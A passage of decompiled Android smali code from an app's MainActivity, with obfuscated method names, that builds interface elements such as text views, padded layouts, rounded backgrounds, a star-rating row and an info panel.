    invoke-virtual {v0, v7, v15, v14, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v3, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v7, 0x7f0f00b7

    .line 211
    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v15, 0xb

    invoke-virtual {v0, v7, v15, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v4, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v7, 0x7f0f00b3

    .line 212
    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v15, 0xd

    invoke-virtual {v0, v7, v15, v14, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v4, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const/16 v7, 0xc

    .line 213
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v15

    .line 214
    new-instance v7, Landroid/view/View;

    invoke-direct {v7, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    invoke-virtual {v7, v15}, Landroid/view/View;->setMinimumHeight(I)V

    .line 215
    invoke-virtual {v4, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v7, 0x7f0f00b5

    .line 216
    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v15, 0xb

    invoke-virtual {v0, v7, v15, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v4, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v7, 0x7f0f00b0

    .line 217
    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v15, 0xd

    invoke-virtual {v0, v7, v15, v14, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v4, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 218
    new-instance v7, Landroid/widget/LinearLayout$LayoutParams;

    move/from16 v16, v6

    const/high16 v6, 0x3f800000    # 1.0f

    const/4 v15, -0x2

    invoke-direct {v7, v5, v15, v6}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v2, v3, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 219
    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v3, v5, v15, v6}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v2, v4, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 220
    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 221
    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 222
    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 223
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5()Landroid/view/View;

    move-result-object v1

    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 224
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    const/16 v15, 0xe

    .line 225
    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    const/16 v5, 0x10

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v1, v2, v3, v4, v6}, Landroid/view/View;->setPadding(IIII)V

    const v2, 0x7f0f00bc

    .line 226
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    const/16 v4, 0xf

    invoke-virtual {v0, v2, v4, v14, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 227
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v2

    const/16 v6, 0x11

    .line 228
    invoke-virtual {v2, v6}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 229
    new-instance v3, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v3}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 230
    iget v4, v0, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN:I

    invoke-virtual {v3, v4}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/16 v7, 0x8

    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    int-to-float v4, v4

    invoke-virtual {v3, v4}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 231
    invoke-virtual {v2, v3}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    const/16 v15, 0xe

    .line 232
    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v2, v3, v4, v5, v6}, Landroid/view/View;->setPadding(IIII)V

    const/16 v4, 0xc

    .line 233
    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    const/4 v7, 0x0

    invoke-static {v2, v7, v3, v7, v5}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    const v3, 0x7f0f00ba

    .line 234
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x28

    invoke-virtual {v0, v3, v4, v14, v7}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    const/16 v6, 0x11

    .line 235
    invoke-virtual {v3, v6}, Landroid/widget/TextView;->setGravity(I)V

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 236
    const-string v3, "\u2605\u2605\u2605\u2605\u2605"

    iget v4, v0, Lio/bluewave/app/MainActivity;->QH62hje1O4khQnco5y:I

    invoke-virtual {v0, v3, v15, v4, v7}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    .line 237
    invoke-virtual {v3, v6}, Landroid/widget/TextView;->setGravity(I)V

    const v4, 0x3da3d70a    # 0.08f

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setLetterSpacing(F)V

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v3, 0x7f0f00bb

    .line 238
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    const/16 v15, 0xb

    invoke-virtual {v0, v3, v15, v10, v7}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    .line 239
    invoke-virtual {v3, v6}, Landroid/widget/TextView;->setGravity(I)V

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 240
    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v2, 0x7f0f00ee

    .line 241
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_4

    const v4, 0x7f0f00ef

    const v5, 0x7f0f00f0

    const v2, 0x7f0f00ee

    const v3, 0x7f0f00ed

    const/4 v15, 0x4

    .line 242
    invoke-virtual/range {v0 .. v5}, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R(Landroid/widget/LinearLayout;IIII)V

    goto :goto_3

    :cond_4
    const/4 v15, 0x4

    :goto_3
    const v2, 0x7f0f00f2

    .line 243
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_5

    const v4, 0x7f0f00f3

    const v5, 0x7f0f00f4

    const v2, 0x7f0f00f2

    const v3, 0x7f0f00f1

    .line 244
    invoke-virtual/range {v0 .. v5}, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R(Landroid/widget/LinearLayout;IIII)V

    :cond_5
    const v2, 0x7f0f00f6

    .line 245
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_6

    const v4, 0x7f0f00f7

    const v5, 0x7f0f00f8

    const v2, 0x7f0f00f6

    const v3, 0x7f0f00f5

    .line 246
    invoke-virtual/range {v0 .. v5}, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R(Landroid/widget/LinearLayout;IIII)V

    .line 247
    :cond_6
    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 248
    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 249
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5()Landroid/view/View;

    move-result-object v1

    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 250
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    const/16 v2, 0xe

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/16 v5, 0x10

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    invoke-virtual {v1, v3, v4, v6, v2}, Landroid/view/View;->setPadding(IIII)V

    const v2, 0x7f0f0104

    .line 251
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    const-string v3, "true"

    invoke-virtual {v3, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_7

    goto/16 :goto_4

    :cond_7
    const v2, 0x7f0f00bd

    .line 252
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    const/16 v4, 0xf

    invoke-virtual {v0, v2, v4, v14, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 253
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v2

    .line 254
    new-instance v3, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v3}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    move/from16 v4, v22

    invoke-virtual {v3, v4}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/16 v7, 0x8

    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    int-to-float v4, v4

    invoke-virtual {v3, v4}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 255
    invoke-virtual {v2, v3}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    const/16 v3, 0xe

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    invoke-virtual {v2, v4, v5, v6, v7}, Landroid/view/View;->setPadding(IIII)V

    const/16 v4, 0xa

    .line 256
    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/4 v5, 0x0

    invoke-static {v2, v5, v3, v5, v5}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    move/from16 v6, v21

    const/16 v3, 0x14

    const/4 v7, 0x1

    .line 257
    invoke-virtual {v0, v8, v3, v6, v7}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v6

    const/4 v3, 0x2

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-static {v6, v5, v8, v3, v5}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 258
    invoke-virtual {v2, v6}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 259
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v3

    const v4, 0x7f0f0105

    .line 260
    invoke-virtual {v0, v4}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v4

    const/16 v6, 0xd

    invoke-virtual {v0, v4, v6, v14, v7}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v4, 0x7f0f00b9

    .line 261
    invoke-virtual {v0, v4}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    const/16 v4, 0xc

    invoke-virtual {v0, v6, v4, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v6

    const/4 v4, 0x3

    .line 262
    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v6, v5, v4, v5, v5}, Landroid/widget/TextView;->setPadding(IIII)V

    invoke-virtual {v3, v6}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 263
    new-instance v4, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v6, -0x2

    const/high16 v7, 0x3f800000    # 1.0f

    invoke-direct {v4, v5, v6, v7}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v2, v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 264
    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 265
    :goto_4
    invoke-virtual {v1}, Landroid/view/ViewGroup;->getChildCount()I

    move-result v2

    if-lez v2, :cond_8

    .line 266
    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 267
    invoke-virtual {v13, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 268
    :cond_8
    new-instance v1, Landroid/view/View;

    invoke-direct {v1, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v4, 0x14

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/4 v5, -0x1

    invoke-direct {v2, v5, v3}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v13, v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 269
    invoke-virtual {v12, v13}, Landroid/widget/ScrollView;->addView(Landroid/view/View;)V

    .line 270
    invoke-virtual {v9, v12}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 271
    iget-object v6, v0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 272
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v7

    .line 273
    invoke-virtual {v7, v5}, Landroid/view/View;->setBackgroundColor(I)V

    .line 274
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vpNdwwpwBwplN()Landroid/widget/LinearLayout;

    move-result-object v1

    invoke-virtual {v7, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 275
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->NGL7fgNWbzfZaqgpQY()Landroid/view/View;

    move-result-object v1

    invoke-virtual {v7, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 276
    new-instance v8, Landroid/widget/ScrollView;

    invoke-direct {v8, v0}, Landroid/widget/ScrollView;-><init>(Landroid/content/Context;)V

    .line 277
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v9

    const/4 v3, 0x1

    .line 278
    invoke-virtual {v9, v3}, Landroid/widget/LinearLayout;->setGravity(I)V

    const/16 v5, 0x10

    .line 279
    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v1

    const/16 v2, 0xe

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    invoke-virtual {v9, v1, v3, v4, v5}, Landroid/view/View;->setPadding(IIII)V

    .line 280
    new-instance v1, Landroid/widget/ImageView;

    invoke-direct {v1, v0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    .line 281
    new-instance v2, LU4clZ2NNNKj5ZWU/n6vOQ2w2T3oBW;

    iget v3, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    invoke-direct {v2, v3}, LU4clZ2NNNKj5ZWU/n6vOQ2w2T3oBW;-><init>(I)V

    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 282
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v3, 0x38

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-direct {v2, v4, v3}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/4 v3, 0x1

    .line 283
    iput v3, v2, Landroid/widget/LinearLayout$LayoutParams;->gravity:I

    const/16 v4, 0xe

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    iput v5, v2, Landroid/widget/LinearLayout$LayoutParams;->bottomMargin:I

    .line 284
    const-string v11, "p3anim"

    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    invoke-virtual {v9, v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const v1, 0x7f0f00cb

    .line 285
    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    const/16 v4, 0x14

    invoke-virtual {v0, v1, v4, v14, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v1

    const/16 v2, 0x11

    .line 286
    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setGravity(I)V

    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 287
    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v4, -0x2

    const/4 v5, -0x1

    invoke-direct {v3, v5, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v3}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    const/4 v3, 0x6

    .line 288
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/4 v13, 0x0

    invoke-static {v1, v13, v13, v13, v3}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    invoke-virtual {v9, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v1, 0x7f0f00ca

    .line 289
    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0xd

    invoke-virtual {v0, v1, v3, v10, v13}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v1

    .line 290
    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setGravity(I)V

    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    .line 291
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v2, v5, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v2}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    const/16 v4, 0xc

    .line 292
    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    invoke-static {v1, v13, v13, v13, v2}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    invoke-virtual {v9, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 293
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    .line 294
    new-instance v2, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v2}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    iget v3, v0, Lio/bluewave/app/MainActivity;->RiYp0dILGNtv:I

    invoke-virtual {v2, v3}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    int-to-float v3, v3

    invoke-virtual {v2, v3}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 295
    invoke-virtual {v1, v2}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    const/16 v4, 0xa

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v12

    invoke-virtual {v1, v2, v3, v5, v12}, Landroid/view/View;->setPadding(IIII)V

    const/16 v2, 0xe

    .line 296
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/4 v5, 0x0

    invoke-static {v1, v5, v5, v5, v3}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 297
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "\u2139  "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const v3, 0x7f0f00c2

    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    iget v3, v0, Lio/bluewave/app/MainActivity;->UpNQeXAsEKI1Y4mvc:I

    const/16 v4, 0xc

    const/4 v13, 0x1

    invoke-virtual {v0, v2, v4, v3, v13}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v2, 0x7f0f00c1

    .line 298
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0xb

    const/4 v5, 0x0

    invoke-virtual {v0, v2, v3, v14, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    const/4 v3, 0x2

    .line 299
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    int-to-float v3, v4

    const/high16 v4, 0x3f800000    # 1.0f

    invoke-virtual {v2, v3, v4}, Landroid/widget/TextView;->setLineSpacing(FF)V

    const/4 v3, 0x5

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v2, v5, v3, v5, v5}, Landroid/widget/TextView;->setPadding(IIII)V

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 300
    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    invoke-virtual {v9, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 301
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    const/16 v2, 0xe

    .line 302
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-static {v1, v5, v5, v5, v3}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    const v3, 0x7f0f00c3

    .line 303
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    const/4 v13, 0x1

    invoke-virtual {v0, v3, v2, v14, v13}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v2, 0x7f0f00c5

    .line 304
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    const v2, 0x7f0f00c4

    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    const-string v2, "1"

    invoke-virtual/range {v0 .. v5}, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc(Landroid/widget/LinearLayout;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    const v2, 0x7f0f00c7

    .line 305
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    const v2, 0x7f0f00c6

